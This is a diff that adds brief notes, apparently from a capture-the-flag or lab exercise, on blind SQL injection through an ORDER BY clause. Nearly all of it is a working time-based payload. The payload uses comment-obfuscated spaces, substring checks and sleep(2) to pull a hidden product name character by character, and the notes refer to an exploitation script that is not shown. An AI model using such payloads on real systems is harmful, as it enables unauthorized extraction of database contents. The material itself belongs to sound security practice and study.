@@ -1,0 +1,7 @@
+Blind Injection in order by
+
+payload idea = (select if((substring('fdmin',1,1)='f'),NULL,sleep(2))
+exact payload = 1,(select/**/if((substring((select/**/name/**/from/**/products/**/where/**/exclusive=1),1,1)=unhex(66)),NULL,sleep(2)));
+
+script: script.py
+
